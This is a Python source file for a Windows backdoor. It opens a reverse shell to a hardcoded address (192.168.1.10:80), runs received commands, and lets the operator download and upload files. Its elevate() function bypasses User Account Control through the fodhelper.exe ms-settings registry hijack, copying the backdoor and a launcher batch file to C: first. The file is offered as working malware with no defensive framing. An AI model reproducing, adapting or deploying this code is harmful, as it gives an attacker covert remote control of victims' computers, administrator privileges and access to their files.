import socket
import subprocess
import json
import os
import sys
import time
import base64
import ctypes

class Backdoor:
    def __init__(self, ip, port):
        self.con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.con.connect((ip, port))

    def recv_plus(self):
        json_data = ""

        while True:
            try:
                json_data += self.con.recv(1500000).decode("utf-8")
                return json.loads(json_data)
            except ValueError:
                continue

    def send_plus(self, data):
        json_data = json.dumps(data)
        byte_data = json_data.encode("utf-8")
        self.con.send(byte_data)

    def execute_command(self, command):
        return subprocess.getoutput(command).encode("utf-8")

    def changeDir(self, path):
        os.chdir(path)
        result = "Changing Directory To " + subprocess.check_output("cd", shell=True).decode("utf-8")
        return result.encode("utf-8")

    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    def write_file(self, path, data):
        with open(path, "wb") as file:
            file.write(base64.b64decode(data))
            return "SHELL >>> Upload Success!!!".encode("utf-8")

    def full_path(self, command):
        if command[0] == "upload":
            path = ""
            for i in range(1, len(command)-1):
                path += command[i]
                if i != len(command)-2:
                    path += " "
                else:
                    break
            return path

        else:
            path = ""
            for i in range(1, len(command)):
                path += command[i]
                if i != len(command)-1:
                    path += " "
                else:
                    break
            return path

    def looping(self):
        while True:
            try:
                command = self.recv_plus()
                if command[0] == "exit":
                    self.con.close()
                    sys.exit()
                elif command[0] == "cd" and len(command) > 1:
                    path = self.full_path(command)
                    command_result = self.changeDir(path)

                elif command[0] == "download":
                    path = self.full_path(command)
                    command_result = self.read_file(path)

                elif command[0] == "upload":
                    path = self.full_path(command)
                    dataElement = len(command)-1
                    command_result = self.write_file(path, command[dataElement])

                else:
                    print(command)
                    command_result = self.execute_command(command)
            except Exception:
                command_result = "SHELL >>> Command Execution Failed...".encode("utf-8")
            self.send_plus(command_result.decode("utf-8"))

def elevate():
    isAdmin = ctypes.windll.shell32.IsUserAnAdmin()
    if isAdmin == 0:
        batFile = "start " + '"MyBackDoor" ' + '"backdoor.exe"'
        print(batFile)
        with open("ini.bat", "w") as file:
            file.write(batFile)

        copy = "copy backdoor.exe C:"
        copy1 = "copy ini.bat C:"

        print(subprocess.getoutput(copy))
        print(subprocess.getoutput(copy1))

        print(subprocess.getoutput("powershell -command New-Item 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Force"))
        print(subprocess.getoutput("powershell -command New-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name 'DelegateExecute' -Value '' -Force"))
        print(subprocess.getoutput("powershell -command Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\Shell\Open\command' -Name '(default)' -Value 'cmd.exe /c C:/ini.bat'"))
        print(subprocess.getoutput("powershell -command Start-Process 'fodhelper.exe'"))
        print(subprocess.getoutput("powershell -command Remove-Item 'HKCU:\Software\Classes\ms-settings\' -Recurse -Force"))
        sys.exit()
    elif isAdmin == 1:
        back1 = Backdoor("192.168.1.10", 80)
        back1.looping()

time.sleep(15)
elevate()
